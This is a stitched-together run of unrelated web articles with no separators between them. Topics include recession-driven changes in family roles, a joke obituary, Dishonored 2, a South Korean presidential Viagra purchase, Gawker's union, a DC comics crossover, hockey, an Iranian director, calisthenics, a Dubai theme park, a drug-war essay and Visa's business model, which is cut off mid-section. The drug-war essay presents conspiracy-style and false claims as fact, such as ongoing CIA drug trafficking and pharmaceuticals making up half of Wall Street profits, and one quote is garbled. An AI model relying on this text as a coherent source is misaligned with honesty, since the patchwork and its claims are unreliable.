On the commuter train back to Long Island, as the New York City skyline disappeared behind him, he tried to think through his family's finances. Although Lynn had taken four months of maternity leave, she still had her job as a lawyer at an insurance company. If he stayed home, they wouldn't have to pay for a nanny. Maybe, he thought, this was a chance to do what he had talked about – to start his own business from home and take care of their baby girl.
The next Monday, Frank said goodbye to Lynn as she left for her office; turned his attention to baby Elizabeth; and started his new, post-layoff schedule: diaper change, feeding, play, feeding, nap. After that, if he had the energy, he could work on his own architectural design business. "It's been wonderful," Frank says. "She [Elizabeth] is so perceptive, so fun. I'm happy to be doing it."
The changes taking place in the Benavides-Golder household are being echoed in different ways across the country, as millions of families restructure their lives amid the worst recession since the 1930s.
Although economic shifts always affect the American family, this downturn, both because of its depth and the disproportionate number of men being laid off, is adjusting roles and relationships at home perhaps more than at anytime since the Great Depression. It is recalibrating who earns the income, who picks up the kids at school, and who makes the weekly trip to the dump.
Not all the changes are good: As family budgets have tightened and roles changed, tensions have risen, and some advocates worry domestic violence is increasing. But in other cases, families have forged new bonds and balanced duties in ways unseen even at the height of the feminist movement.
"We've never gone into a recession like this, with this configuration of family values, with so many women in the workforce," says Stephanie Coontz, a professor of history and family studies at Evergreen State College in Olympia, Wash., and the director of research for the Council on Contemporary Families. "If it weren't so sad for so many families, this would be an incredible social experiment."
Some of this disparity can be explained by the deep cuts in the manufacturing and construction industries, which are predominantly male. (In construction, men held 87.5 percent of the jobs at the end of 2007, in manufacturing, 71.2 percent.) In these two sectors alone, some 2 million jobs have been lost – including Kevin Hamilton's.
At the beginning of last year, Kevin and his wife, Cheryl, thought they were on their way toward financial security. Kevin had just gotten a $16-an-hour job at the SMART Papers paper mill outside Cincinnati – $4 better than he was making as a store manager at Dollar General. With their four young children, the couple decided to move out of their rented townhouse and into a trailer. It was supposed to be a temporary move, Cheryl explains now with a sigh, to cut costs and save up for a house of their own. But three days before Christmas, and two months after the birth of their youngest child, Kevin was laid off.
"I thought, 'What are we going to do?' " Cheryl recalls. "I went out right away and got food stamps. He immediately started putting in applications. He probably applied at 100 different places."
A month later, he got a call back from Target, which offered him an early morning, part-time position. He took the job, but his take-home pay dropped from about $3,000 a month to $800 a month. He and Cheryl decided he should go back to school, in hopes that an information technology degree would help the family in the long run. But after a few months, they started slipping behind on their rent and their car payments.
Cheryl, who had been a stay-at-home mom, decided she needed to work. She took the only job she could find: a $7-an-hour position at a gas station. Now she starts work around 3 p.m., before her 9- and 7-year-old get back from school, and gets home at 10 p.m., after they're in bed.
Kevin has started taking over more child-care duties – getting the kids off the bus, feeding them dinner, taking them to baseball practice – and doing more housework. The change in roles has helped them keep the refrigerator stocked and develop new empathy for what the other does. But Kevin could do without the housework, and Cheryl says that while it's nice to have her husband better appreciate all she did as a stay-at-home mom, she'd trade that for her old life – instantly.
"I come home at night and I see my little baby here sleeping," she says. "I miss the older two because they're in school all day. I look at them and I just start crying. I hate this. I loved being a stay-at-home mom because everything was done around the house; I loved playing with them and watching them grow. I want to cherish all the time I have with them. But with the economy the way that it is, I feel like I'm robbed of that."
Manufacturing and construction might be among the recession's hardest-hit industries. But even outside those sectors, men have lost twice as many jobs as women; economists say they are seeing gender imbalances at all socioeconomic levels.
The percentage of men giving up on the job search has also risen sharply. Since December 2007, the male unemployment rate – the percentage of people who are looking for, but have not yet found, work – has increased steadily during this recession, hitting 9.4 percent in April. But the number of men who, each month, go from the "unemployed" category to not looking for work at all has also grown significantly.
Researchers say it will be months, if not years, before they have any solid data on what these men are doing – whether they are going to school, staying home with children, or simply giving up. All they can say for sure is that the changes are huge.
"We've never seen a gender imbalance like the one we're seeing now," says Heather Boushey, a senior economist at the Center for American Progress. "What we don't know yet is how this will play out in families."
"The whole generation of kids who grew up in that associated their mothers' work with their fathers' depression," Coontz says. "Instead of being proud of their mothers' work, they were embarrassed."
Those children grew up to be the adults of the 1950s, and even less open to mothers working outside the home, she says. Those women who did have jobs were taught to avoid any sort of employment that might be interesting enough to distract from family duties. They were also cautioned against taking raises. "The most important thing you could do was to protect the man's ego," Coontz says. "That's really changed in the last 30 years."
Women's involvement in the workplace has increased steadily since the 1950s. According to a recent Family and Work Institute study, younger women today are just as likely as their male peers to want jobs with more responsibility. The 2008 National Study of the Changing Workforce also found that 79 percent of married or partnered employees live in dual-earning households and that the women in these couples earn on average 44 percent of the household income. Overall, while women still only make 80 cents to every dollar earned by a man, more than a quarter of women in dual-earning couples make substantially more than their partners.
This shift in earning power has made it easier for some couples to adjust to their new, recession-era roles. Chuck Northrop had been the lead graphic designer in the marketing department at Colliers International, a commercial real estate firm in San Diego, when he was laid off at the end of August.
"It was unexpected," he says. "Even though I had a feeling things were bad because of what was happening in the real estate market, I was in shock."
His wife, Lynn, is a clinical psychologist at Grossmont Hospital, treating severely mentally ill adults. She had been working less than full time – four days a week until 3 p.m. – but still made a higher salary than Chuck. After his layoff, she was able to increase her work time to 4-1/2 days a week.
Because of her hours, Lynn had been the one to pick up their two children, 12-year-old Claire and 8-year-old Aiden, from school, drive them to afternoon activities, and make dinner. Now, Chuck is the one who helps with homework, cooks, does the laundry, and straightens up the family's sunny home in the city's South Park neighborhood.
"Some days I don't get home until 6 or 7 p.m., so obviously Chuck has already prepared dinner by the time I get there," says Lynn, her hand over his.
Both say that their adjustment has been relatively smooth; Lynn remembers how Chuck supported her when she went through a job loss a few years back, and Chuck says that he has actually been "thrilled" to spend more time with his kids. "I think right now we are closer than we've been in a long time," Lynn says, looking at Chuck, who nods in agreement. "Sure, he's going to need to get a job and unemployment is going to run out. But right now, this new arrangement is good for us."
The way Chuck and Lynn have worked out their new gender roles can be a crucial part of surviving the recession. "You have to realize that when someone's laid off, the roles are going to be in flux," says Nancy Collamer, a career consultant and the author of "The Layoff Survival Guide," which she wrote after her husband lost his job in the tech industry. "It is critically important for you to communicate, and for you to keep communicating; and to recognize that as the situation evolves, there may need to be some renegotiation. What works for the first three months might not work for months six through nine."
So even though fewer Americans embrace traditional gender roles today – the Family and Work Institute study found a 32 percent drop over the past decades in the number of men who believe it is better "if the man earns the money and the woman takes care of the home and children" – these ideas remain deeply entrenched. Forty-one percent of workers today still believe in those traditional roles; of female responders, the figure was 39 percent.
Aaron Hardisty, who was unable to find a job after graduating from business school last year, says these perceptions were a factor in the end of his marriage. Although he was taking care of his 3-year-old son and trying to keep up the house, he says he could tell his wife was unhappy with his role. "What woman will say she doesn't want a guy who is home every night and cooks every meal and does all the shopping?" he says. "But eventually it becomes self-emasculating. People wonder, 'Where's the man?' "
Still, with so many fathers out of work, lingering prejudices may soften. "Men will be better able than any other previous generation of husbands and fathers to say, 'Look, here's the silver lining: I can spend more time with my kids,' " says Coontz.
Ted Jablonski, like Chuck Northrop and Frank Benavides, has embraced that bright side. Earlier this year, the Boston financial company where Mr. Jablonski worked restructured its departments, and Jablonski found himself without his marketing executive job. Since then, he has begun his own consulting business from home, while spending more time with his three teenage children.
"It's not just helping them with homework or going to their lacrosse matches or softball games," he says. "It's having real time with them ... talking about current events or the economy or sports or colleges. It's just great to be able to have that sort of interaction. And spending that much time when you're just not available 60 hours a week, or more – it's hard to do."
Many fathers feel that dilemma. According to the Families and Work Institute study, more than half of the fathers in dual-earning households report significant work-life conflict – more than women in equivalent situations. Ted and his wife, Susan, have used the downturn to talk with their children about politics, economics, and personal values.
"This past year has really forced people to step back and say, 'What's really important to us in our lives?' For a lot of people it's not buying a new car, taking a new trip, or buying a flat-screen TV. It's getting time with family and friends."
Coontz agrees. "We've been on a treadmill the last 15 years," she says. "Going cold turkey – that's not the easiest way. But some families will end up stronger."

Obituaries are having a moment right now. Whether for their succinctness or odd requests, it seems like some dearly departed people can't help but make one last solid joke. Mary Anne Alfriend Noland was apparently no different—rather than sit through another six months of campaign coverage and vote in the upcoming presidential election, she died. Seriously.
"Faced with the prospect of voting for either Donald Trump or Hillary Clinton, Mary Anne Noland of Richmond chose, instead, to pass into the eternal love of God on Sunday, May 15, 2016, at the age of 68," her obituary begins. There are a number of groups, for a number of reasons, choosing to not vote in this upcoming election, and even some politicians, but Mary Anne Noland, mother of three and "Grammy" of 10 has truly shown her real thoughts about this election with her decision.
Here's what the obituary looked like in today's Richmond Times-Dispatch:

According to the rest of her obit, people are encouraged to make memorial contributions to CARITAS in lieu of flowers. CARITAS provides homeless services to the most vulnerable residents of Richmond.

Dishonored 2 deepens the story of Corvo and Emily Motivations and family intrigue play into the next installment of the popular franchise.
Arkane Studios' Harvey Smith revealed something at E3 that fans of Dishonored had suspected for some time. Empress Jessamine Kaldwin's daughter Emily was also the daughter of lord protector and protagonist Corvo Attano. With the move to Dishonored 2, Corvo and Emily move on from the Empress's assassination together, 15 years to be exact, but with separate motivations as her death still weighs heavily on both.
Both characters are playable this time around, but the focus has been placed on Emily and how she handles being Empress, under the watchful eye of Corvo, who has unified the titles of Royal Protector and Royal Spymaster in Dunwall for the first time. We knew her as a child, and how Corvo's activities in the first game played into her mindset and emotions, depending on his chaos level. “We got contacted by so many players who told us that they literally changed the way they played after they came back from a particularly violent mission and saw that Emily had posted up these disturbed drawings in black crayon,” Smith said in discussing the project. So the team broke her character down into more detail to give her more depth in Dishonored 2
“When we approach a character like Emily, we need to know her history, her attitude, even her hobbies,” Smith said. “But at a meta level as a game developer, we need to know what her pillars are. And so for Emily we arrived at: Dunwall, Empress, Assassin.”
The team looked at her upbringing, her intelligence and even her early training at Corvo's hand. While she has lived a privileged life as an Empress, she has another avenue open to her. “Corvo assumed that some day Emily's enemies would come for her with knives out,” Smith said. “So she has the potential in Dishonored 2 to become an assassin.”
And when developing her character, the team relied on the pillars established for her in everything from her attitude and powers, to her clothes. She wears finely tailored garments and carries weapons that look as if they were made by the finest craftsmen in the Empire of the Isles. Even her powers from the Outsider reflect a royal nature and her ability to influence a crowd.
“In a way you can say the Outsider marks people according to their personalities,” says Lead Designer Dinga Bakaba. “She's an Empress. She's younger. She has a different personality. So her powers reflect that. She has a lot of powers that allow her to subdue the will of others.” One such power is Mesmerize, which allows Emily to entrance her enemies to eliminate them or move past them unnoticed. Another is Domino, which links a group of enemies together so they can all be affected by a single action.
While Emily has been the focus as a new playable character, Corvo has not been ignored. His original powers return, but with some enhancements. “You now have upgrades you can acquire, and you have a power tree,” Bakaba said. “I think players will have an interesting experience playing the game once with Emily and once with Corvo, because different powers mean different solutions to problems and a different experience.”
And this time around, Corvo gets a voice. If you ever played the first Thief game, you will recognize it as the voice of Garrett. "We were lucky to get Stephen Russell," Smith said. "Stephen just nailed it."
While the story has not been fully revealed, Smith has said that Emily has had something taken from her, forcing her to leave Dunwall for Karnaca. “At the beginning of Dishonored 2, she loses everything and she's on the run,” he said. “This is also Emily's first exposure to the way the rest of the world lives." And although we don't know the cause of Emily's forced departure, we have already speculated that an old antagonist may be making a return.
As for Corvo, he is going home. “You can literally visit his home neighborhood when you play Dishonored 2,” he said.
So even though both characters will visit many of the same locations and encounter many of the same people, they will be coming at the situations from totally different perspectives. "That was something important for us to get right,” Smith said.
Dishonored 2 is scheduled to come out on November 11 for Xbox One, PlayStation 4 and PC.

An increasingly strange political scandal surrounding South Korean President Park Geun-hye has now left her office defending the purchase of hundreds of erectile dysfunction pills.
Park's office on Wednesday confirmed revelations by an opposition lawmaker that in December it purchased about 360 pills in total – 60 Viagra pills and the rest a generic version of the drug.
Park's office said the pills were bought to potentially treat altitude sickness for presidential aides and employees on Park's May trips to Ethiopia, Uganda and Kenya, whose capitals are up to two kilometres above sea level.
South Korean doctors sometimes prescribe Viagra-style drugs to climbers because they are believed to be effective in preventing altitude sickness.
"We bought them, but they were left unused," said Jung Youn-kuk, spokesman of the presidential Blue House.
Anti-aging purchases also cited
Viagra became the most searched keyword among South Koreans on the country's main online news portals following the news, which was initially reported by an opposition Democratic Party member of parliament.
Democratic MP Kim Sang-hee said data from the country's public health insurance review service showed Park's office also bought injections widely used in cosmetic and anti-aging treatments.
Park is now bracing for an impeachment push by opposition parties and some members of her own Saenuri Party amid allegations that she let a secretive confidante manipulate government affairs and amass an illicit fortune, a scandal critics say undermines the country's democracy.
On Sunday, prosecutors said they believe Park was collusively involved in the criminal activities of her longtime friend, Choi Soon-sil, and two presidential aides who allegedly bullied companies into giving tens of millions of dollars to foundations and businesses Choi controlled, and also enabled Choi to interfere with state affairs.

What happened at Gawker suggests that there may be more potential for successful union organizing in the 21st century than conventional wisdom suggests.
In part because new organizing has been at a low ebb in recent years, especially in the “new economy,” young workers are less likely to be unionized than their older counterparts. But that doesn't seem to reflect workers' own preferences. In fact recent surveys show that millennials — the dominant demographic at Gawker and other digital media companies — are far more often pro-union than their baby boomer counterparts.
Young workers are less likely to be unionized than their older counterparts, but that doesn't seem to reflect their own preferences.
Although millennials are also famously wary of bureaucratic institutions, many unions no longer fit that stereotype.
Decades ago the Harvard Union of Clerical and Technical Workers won recognition with a campaign whose main slogan was “It's not anti-Harvard to be pro-union!” The Writers' Guild East, the union that now represents Gawker's employees, has explicitly embraced this non-adversarial approach as well.
To make a real difference in today's economy, unions need to meet the needs of young, college-educated workers like those at Gawker as well as workers struggling at the bottom of the labor market, in industries like fast-food and retail. As inequality between the haves and have-nots continues to widen, organized labor is the one surviving institution that systematically pushes in the other direction. The union movement is struggling to reinvent itself in a more hostile political and economic environment than the nation has seen since the early 1930s.
Intransigent opposition to unionism has become standard business practice. An entire industry of “labor consultants” (also known as union busters) systematically assists companies in squashing any budding organizing campaigns that crop up. Many of the standard anti-union tactics are perfectly legal, but a large number of employers don't take any chances: Firing workers for union organizing — illegal under the 1935 National Labor Relations Act — is five times as common today as in the 1950s.
Gawker is an exception among U.S. employers since its C.E.O., Nick Denton, did not appear to oppose the union campaign. Survey after survey suggests that a large majority of workers would vote for a union in their workplace, given the opportunity. Sadly, few get that opportunity these days, and when they do, employers typically go to great lengths to intimidate them into voting no.
And yet there are a few hopeful signs. The Gawker election is one of them, along with the fast-food workers' campaign that has been building momentum over the past couple of years. It's too soon to herald a labor comeback, but those who have written off unions as obsolete and irrelevant should think again.

Janus Directive
The Janus Directive was a 1989 11-part ‘mini' cross-over that ran through the issues of Checkmate! v1, Suicide Squad v1, Manhunter v1, Firestorm v2 and Captain Atom v5. Checkmate! and Suicide Squad were both being published bi-weekly during this cross-over. This was DC's 5th foray into multiple-title cross-overs since Crisis on Infinite Earths (published in 1985).
Masterminded by several writers (including John Ostrander who was writing Suicide Squad, Manhunter AND Firestorm at the time), it was basically a 'government black ops super-teams vs organization hell-bent on ruling world' type of story.
Interesting to note that the main antagonist, Kobra, is a well-funded international terrorist organization, has access to laser beam satellites and the leader kind of looks like Serpentor (of G.I.Joe) - which begs the question: who came first, DC's Kobra or Hasbro's Cobra? Kobra's first appearance was in 1976 in it's own title (Kobra #1), and Cobra's first appearance was in the G.I. Joe toy line in 1982. The Cobra organization itself was the brainchild of Marvel comics (specifically Archie Goodwin) when Hasbro commissioned them to create the comics to accompany the toy line.
During the Reagan years (1981-1988) it was not uncommon for then-president Ronald Reagan to make an appearance in a DC comic. This time Bush Sr made an appearance to lay down the law on how government sponsored super-groups should behave. [Insert speculation about comics being used as a left-wing media tool here.]
As indicated in the house ad above, a black and white checklist card was being distributed by DC comics at comic book shops to help fans make sure they picked up all of the issues in the mini-series.
As far as sales went, I'm not sure how well this cross-over was received by the fans. I really like Suicide Squad, but having to trudge through issues of Checkmate! and Captain Atom to continue the story was kind of a disincentive to keep reading this cross-over.

The meteoric rise of the Toronto Marlies over the past few months has been a fun story to follow along with, but these last few weeks in particular have been nuts. All of the heavy artillery players seem to be hitting the net with total precision. Points have been gained where they shouldn't be and dropped in disadvantageous areas. Even as they started closing in, things seemed unlikely.
But the wins started piling up. Not only have the Marlies squeaked into the playoffs, they've jumped into the seventh seed.
The Rundown
Toronto came out guns blazing to open this one, and eventually, it played out to their advantage. With five minutes left in the first period, Jack Rodewald's first professional point turned into Greg McKegg's career high 22nd goal of the season, giving the Marlies a 1-0 lead. Early in the second period, the firsts continued, as Erik Bradford opened up his professional account to widen the gap, quickly followed by Matt Frattin, who potted his team-leading 26th of the year.
The Marlies weren't done, however. Midway through the second, Byron Froese set up William Nylander, who netted his fourteenth of the season. For a while, it seemed like that would be all she wrote, but the Wolves still had some fight left in them. Jeremy Welsh snapped Antoine Bibeau's shutout with a shorthanded goal, and Robby Fabbri picked up his first professional goal just a few minutes later. Chicago, desperate to come back, started pulling their goalie relatively early, and with a minute to go, TJ Brennan capitalized on it, scoring his twelfth and wrapping up the regular season for his team.
Blue Warriors
This entire team. I know its a cop out, but you have to give them credit for what they've done over the past few games, and really, the past few months. I don't think anybody realistically expected this, including the group that carried it out. So lets give them all credit for now, until we inevitably chase them down with a comically oversized microscope.
What Next?
Ladies and gentlemen, its time for playoff hockey. The Marlies will take on the Grand Rapids Griffins in the first round of the playoffs, beginning on Saturday afternoon. The Griffins, presumably to save on travel costs (this is a legitimate AHL concern), have opted to give Toronto the first two home games and take Game 3, along with 4 and 5 if necessary. We'll have a full series preview at some point this week.
Iran's first Oscar-nominated female director says film is call for peace and women's rights
By Parisa Hafezi
ISTANBUL, Oct 30 (Reuters) - Iran's first Oscar-nominated female director has challenged President Donald Trump to watch her film to see if its portrayal of ordinary Iranians' experience of war and revolution will change his views of her country.
The U.S. president has called Iran a "terrorist nation" for involvement in conflicts in the Middle East, and derided an international deal that scrapped sanctions on Iran in return for curbs on what many in the West believe was a nuclear weapons program.
Narges Abyar's Farsi-language film "Nafas" (Breath) follows a young girl, Bahar, living through the changes that follow Iran's 1979 Islamic Revolution and the start of the Iran-Iraq War in 1980 with her impoverished family.
Her greatest fear is losing the chronically asthmatic father who is bringing her and her three brothers and sisters up on his own, and she spends much of her time making sure that he is still breathing. Bahar's devout grandmother, far from being kindly, punishes her for refusing to go to Koran school.
The film and Abyar's Oscar nomination have angered hardline conservatives in Iran's establishment, who call the Iran-Iraq war the "Sacred Defence" and consider the movie anti-Islamic.
"Three a thousand (Iranian) children were killed during the war. Why should I not show all these?" Abyar told Reuters in an interview. "This film promotes peace."
She said it could also "help American society ... to understand that Iranians are not terrorists, as claimed by some politicians".
"Trump is using the language of threat against Iran ... what will he think if he watches Nafas? Will he continue to threaten Iran?"
"I WISH I WERE A BOY"
The film's anti-war message runs alongside an exploration of what it means to be a woman in Iran, where Abyar lives and works.
"I chose Bahar because ... I wanted the world to understand all the limitations an Iranian girl faces ... Bahar was even banned from playing with her male cousin at a certain age ... At one point, Bahar says: 'I wish I were a boy'," Abyar said.
"Outsiders may think it is the influence of the establishment or the religion, but it is not. It is the culture ... and even many women in Iran believe that men are more capable than women, and women should have fewer rights than men."
To follow in the footsteps of her male compatriot Asghar Farhadi, winner of the Oscar for Best Foreign Language Film category in 2012 and 2016, would for Abyar be a recognition of her struggle against sexism in her industry and wider society.
"In Iran, like many other countries, women are disdained, considered second-class citizens ... As a woman, if you want to produce new ideas and be successful, you have to fight."
Iran's women are among the most highly educated in the Middle East and allowed to do most jobs, glass ceilings permitting. But under its Islamic legal system, they have fewer rights than men in areas including inheritance, divorce and child custody, and are subject to travel and dress restrictions.
Abyar said she had hoped for more from the pragmatist president, Hassan Rouhani, who owed his 2013 and 2017 election victories in great part to women voters encouraged by his promises of social and cultural liberalisation.
"Women's situation has improved a bit in Iran," she said. "But I was expecting improvement in more areas."
Abyar encountered less pressure than expected from the authorities to censor parts of her film, but added: "I cannot say that the government defended me when the film was criticised by hardliners."

Health and fitness are important parts of life, and are part of a mindset that I make sure is part of my day every day – even if that means just having an active rest day. I believe the body requires exercise every day. For a while I used to lift weights at a gym, but then that changed for me and I want to share some info about why I chose to leave that behind.
It's not that there is anything wrong with lifting weights at the gym or at home, as there are multiple ways to “get results” in the fitness world. But I believe it comes down to enjoying something and asking what you want from your exercise. For me, right now, I use a combination of training styles, with calisthenics as the focus. With calisthenics (body-weight training) you can get all the same results as weight-lifting, become very strong, and build a truly firm foundation, while lowering your risk of injury significantly compared to weight-lifting.
Calisthenics (Body-Weight Training)
I, along with many others, strongly believe that calisthenics is the future of fitness. It's already taken off in some countries and is now showing its spark here in Western culture -and for good reason. Many people I talk to lately seems to be looking for something different, as if they are bored of the same old gym/weight routine just as I was. It also seems people want to have more fun when they work out.
Calisthenics is about functional strength, natural looking bodies, free workouts, creativity, self-mastery, and healthy routines. It is also something many people can do. I believe that in general we are moving in this direction because times change, our minds change, and things seem to be shifting towards a more natural way of being, which means getting out of repetitive cycles.
Why I Left The Gym
I worked out at the gym for years and was lifting heavy. Did it work? Absolutely, I got plenty of muscle and gained strength. Exercising was part of my routine in high school, as I was inspired by a kinesiology course I took where I learned all about the body, muscles, nutrition, and how to work out to get results.
But I noticed that I started to get tight, I wasn't flexible, and it was easy, even with proper form, to irritate joints when lifting heavier weights. I didn't feel my whole body was getting strong either, just in certain parts doing specific things. Plus, I didn't like the gym and lifting weights – the vibe, the repetition, the lack of creativity, the people so focused on hyping themselves up, looking at themselves in the mirror all day – it simply wasn't for me. My goals were never about impressing people with my body. I wanted to be healthy, have functional strength, enjoy movement, have healthy joints, build strong neurological connections to my body, and exercise in an environment I liked.
Functional strength is strength that you utilize in everyday tasks. It also goes along with a lot of natural body movements. What I noticed in my experience from weight lifting was that I could get stronger at certain exercises yet I didn't notice much functional strength increases versus training calisthenics. This was further illustrated to me when I would train my back and shoulders like crazy with weights, yet could only do a small amount of pull-ups. Weight-lifting exercises can often train very localized muscles, whereas with calisthenics it's naturally more of a full-body workout. Again this comes down to what you are looking for. This was probably one of the most noticeable differences for me, I was gaining strength throughout my whole body in areas that I felt didn't get touched when I was weight-lifting. Plus, doing calisthenics and avoiding heavy weights healed injuries that I had struggled with for years.
Coming from a point of having my back and core heavily injured, this was a huge transformation for me. The photo below is of me after only 3 months of calisthenics training. My form for this “human flag” is not perfect yet in this picture, but it's not far off. Three months later (today), I can now hold that same move with straight arms and flatter legs.

Choosing A Workout That's Right For You
First off, don't let anyone tell you what routine you should be doing or what workout methods are best. You have to do what's right for you, and being aware of your options will empower you. If you don't enjoy your workouts, then you will have a hard time with motivation and in general you will be forcing yourself to do something you don't like. Find what works for you, calisthenics is only one option out of many.
For me, getting out of the gym and into outdoor calisthenic workouts made me LOVE my workouts. Compared to when I used to lift weights, I've never felt this good. I'm stronger and more flexible than I have ever been. My mind and body connection is through the roof and even though my goals are health related, the appearance of my body is the same as when I used to lift heavy, except now my muscles are longer and my body isn't puffy and bloated (could be diet too.) I also don't need to go through bulk up phases and then slim down phases because my nutrition choice is a sustainable lifestyle versus being strictly fast-goal oriented.
Currently I do a mix of calisthenics and yoga. I add in sports and active rest time on days where I don't work out. Don't be afraid to use multiple workout methods and switch things up. It seems we often get afraid that as soon as we stop working out we'll deflate. If that's happening to you, you're probably not building sustainable muscle.
Focusing totally on body image is a mindset I truly believe Western culture struggles with greatly; we are obsessed with physical results and short-term results. We'll do anything to be a “hunk,” even if it's not healthy for us. When you take the ego away and go for what's a true healthy choice for you – for mind, spirit, and body – your choices and goals become very different, and your results do too.
Check Your Mindset & Goals
So is calisthenics for you? You answer that question yourself. What appeals to you? What do you want your lifestyle to look like? What do you like doing when you work out? You have to enjoy it! There's no wrong answer.
If you want to be a body builder, and have that huge body, maybe compete in competitions, or be a power lifter (a couple reps of a ton of weight), then you will need to lift weights simply because you have to stress your body to incredible levels to get those results. You also have to eat in a specific manner to get those results and to be honest, much of the diet advice you get from these types of athletes is not all that healthy for you long-term. But of course you can make healthier diet choices.
If you are looking for a lot of functional strength, solid bone, and ligament health, good cardiovascular fitness, or a toned, muscular looking body, calisthenics will give you all of that as well.
One myth you hear a lot is that you can't build muscle mass or get good results with calisthenics, but this isn't true at all. You will gain a lot of strength and size, and be in great shape just as anyone working out at a gym does. There are easy exercises and tough exercises, and many of weight lifters have trouble performing some of them. Your body is your weight, so it's not like you are not lifting weight, there's just no added weight. You'd be surprised how hard many of these exercises are and how well they work any other body part, without an increased risk of hurting yourself.
This guy pretty much sums it up well and he's been through a ton of different techniques. He explains why, in his opinion, he feels bodyweight/calisthenics is best. He does still lift weight as he believes in multiple types of training, but he covers some great points.
Bottom Line
I'm simply trying to lead us to realize that it's about kicking the ego out of your health and make it about a lifestyle choices and health. You can play in whatever realm you like, there's no need to judge either, but keep yourself honest and in check with what you are doing and why. You have options. Choose what's fun and engaging for you!

The world's largest indoor theme park will open its doors to public on August 15, 2016, promoters Ilyas and Mustafa Galadari Group (IMG Group) announced in a media meeting in Dubai today.
With Dubai Parks and Resorts already announcing that they are all set to open their theme parks in October this year, the IMG Worlds of Adventure will have a couple of months' headstart even as Dubai is set to become the theme parks hub of the region.
Calling it Dubai's first international mega-themed leisure and entertainment destination, Lennard Otto, CEO of IMG Worlds of Adventure, said Dubai is following the Orlando 2.0 model and will house several theme parks which will all be part of the overall tourism strategy.
Tickets will be priced at Dh300 for adults and Dh250 for children, announced Otto, who also said that details of multiple day and annual passes will be announced later.
The tickets will be available for sale online starting tomorrow, April 25, 2016.
“We are very excited to announce our opening date and look forward to IMG Worlds of Adventure coming to life in August of this year. As the first international leisure and entertainment destination in Dubai, we have designed an entire world of entertainment for our guests,” said Ilyas Galadari and Mustafa Galadari, Executive Co-Chairmen and Owners of the Ilyas & Mustafa Galadari Group.
The indoor theme park will be open 365 days a year, said the owners, and added that the park has a capacity of 30,000 visitors per day.
“With the capacity to welcome more than 30,000 people a day we anticipate 4.5 million guests in our first full year of operation, contributing to Dubai's position as a leading tourism hub,” the co-owners said.
“The park is 96 per cent complete as of today,” said Otto, who noted that only final approvals and final testing of certain attractions remains.
The park, complete with 20 rides and attractions, will open in its entirety on August 15, with the exception of the 12-screen Novo Cinema, which will open shortly thereafter.
This $1 billion project is fully indoors and comprises four zones: Marvel zone, Cartoon Network Zone, Lost Valley Zone and the IMG Boulevard.
“IMG Worlds of Adventure promises guests a remarkable immersive indoor theme park experience, bringing together the best international and local interactive entertainment and globally recognised characters and superheroes,” said Otto.
IMG Worlds of Adventure will have more than 1,600 employees and 4,500 parking spaces.

An interesting piece about the prevalence of crystal meth in the modern US:
Suppliers of drugs, consumers of drugs, and even drug addicts have long been known to be “rational” as a group — yes, rational, but stick with me. They respond to changes in prices; they respond to quality differentials and to changes in quality. They also respond — rationally — to changes in risk. So if drug users select their drug of choice using a rational decision-making process, what explains this “march to the bottom” and the emergence of meth in illegal drug markets? The answer is that crystal meth is a cheap date; it has been referred to as the poor man's cocaine. Cocaine and meth are both stimulants, so it is reasonable to assume that they appeal to the same subset of drug users. During cocaine's heyday, meth was nearly extinct on the illegal market. This changed with Reagan's “War on Drugs,” which was effective in raising prices for illegal drugs by imposing greater risks and thus higher costs on production, distribution, and consumption. The initial shock of the war on drugs sent black-market entrepreneurs back to the drawing board; they needed to reduce their risk and their costs. What they came back with included highly potent marijuana, crack cocaine, and crystal meth.
It doesn't take much to figure out that the War on Drugs, just as any other government program, is a very lucrative means used by bureaucrats to transfer extorted money to friends, lobbyists, and themselves.
The United States is the world leader in terms of the percentage of people sitting in prison. Yes, there are more people per 100,000 citizens incarcerated in the US than in China, Russia, or Iran!
According to a study by the U.S. Department of Justice, of the 2.2 million Americans that are currently incarcerated, 21.2 percent of them are non-violent drug offenders. That's about 466,000 people serving time in rape rooms and mandatory labor camps without having violated anybody else's rights.
When you make it risky to obtain a substance you drive up its price to ridiculous levels. When you drive up its price you make it immensely profitable for dealers to get people hooked on drugs through free samples or even forceful inducement. Obviously it's in the dealers' best interest to keep such policies going.
Then there are prison companies, such as the Geo Group, who are contracted by state and local governments, getting paid based on how many people they imprison, and whose stocks are traded on Wall Street. So their investors and banks have an incentive to keep this racket going by lobbying politicians who vote in a favorable manner.
There are law enforcement agencies with agents, police officers, sheriffs, prison guards who all benefit from such policies because their budgets are increased.
There are pharmaceutical companies whose drugs have been proven to kill or cause long term depression and mental disorders in more people than marijuana would ever even come close to. In fact, there are zero deaths reported as biochemical results of marijuana use. There are more people dying dying from Tylenol, Aspirin or Advil per year. Meanwhile marijuana has been proven to provide many of the desired pain relief effects at much less cost, people can even grow it at home! So obviously the huge pharmaceutical lobby, representing about 50% of Wall Street profits, has an enormous vested interest to invest in Congresspeople who will keep the drug war going.
There are Alcohol and Tobacco companies who were the main sponsors of the anti drug campaigns of the 80s. Alcohol and Tobacco combined kill over 500,000 Americans a year. So you can imagine how much of an incentive they have to ensure that their big competitor, marijuana, remains expensive.
The C.I.A itself was and probably is still trafficking drugs into the US because the business has become so lucrative. There is evidence and testimony from several former federal agents confirming this. You can find more on this in the movie American Drug War – The Last White Hope.
So there are all these people, all from completely different walks of life, unknowingly pulling on the same string to protect their own interests.
In a stateless society such people would have no vehicle to implement their destructive agendas.
It is the existence of a state in the first place, that allows them to bring these plans to fruition.
So long as liberals and other statist drug war opponents don't understand this simple causality and relentlessly start pointing at the root cause of the problem, they need not be surprised if things won't change for the better one tiny bit.

This post is about how Visa makes money. Firstly, we explain how Visa credit card payment processing works. Then, we explain the key elements of Visa business model. Then, we explain how Visa business model is different from that of American Express. Finally, we share the revenues, the profits, and the profit margins of Visa for FY 2015 (fiscal year ending September 2015).
About Visa
Visa is a global payments technology company. It connects consumers, businesses, financial institutions, and governments in over 200 countries. It operates the world's largest retail electronic payments network. It is the world's most recognized global financial services brand.
How Visa Credit Card Payment Processing Works?
Visa serves a two-sided market. It serves cardholders, issuers, and issuer processors on one side. On the other side, it serves merchants, acquirers, and acquirer processors. Visa neither issues cards to the cardholders nor solicit merchants to accept its cards. These are the responsibilities of the issuers and the acquirers respectively.
Cardholders are the individuals that possess a Visa payment card.
Issuers are the financial institutions that issue Visa cards to the cardholders, extend the credit to them, and determine the interest rates or the other fees charged to them.
Issuer Processors are the third-party institutions with proprietary technology platforms to handle the transaction processing for those issuers that do not have in-house capabilities. Issuers often outsource the transaction processing to the issuer processors.
